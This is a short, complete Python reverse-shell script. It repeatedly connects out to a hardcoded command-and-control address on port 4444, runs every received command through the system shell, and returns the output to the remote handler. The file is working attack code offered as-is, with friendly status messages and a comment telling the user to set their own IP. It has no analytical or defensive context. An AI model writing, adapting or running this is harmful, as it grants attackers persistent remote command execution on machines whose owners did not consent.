#!/usr/bin/env python3
import socket
import subprocess
import time
import sys

print("🚀 Starting reverse shell...")

# ======== YOUR WINDOWS IP ========
C2_IP = "192.168.1.167"  # ← MAKE SURE THIS IS YOUR WINDOWS IP!
C2_PORT = 4444
# =================================

def connect():
    while True:
        try:
            print(f"🔗 Connecting to {C2_IP}:{C2_PORT}...")
            
            s = socket.socket()
            s.settimeout(10)
            s.connect((C2_IP, C2_PORT))
            
            print("✅ Connected! Waiting for commands...")
            
            while True:
                # Receive command
                data = s.recv(1024).decode().strip()
                if not data:
                    continue
                    
                print(f"📨 Received: {data}")
                
                if data.lower() == 'exit':
                    break
                
                # Execute command
                try:
                    result = subprocess.run(data, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                except Exception as e:
                    output = f"Error: {str(e)}"
                
                # Send output
                s.send(output.encode())
                
        except ConnectionRefusedError:
            print("❌ Connection refused - Is handler running on Windows?")
        except Exception as e:
            print(f"❌ Error: {e}")
        
        print("🔄 Retrying in 5 seconds...")
        time.sleep(5)

if __name__ == "__main__":
    connect()
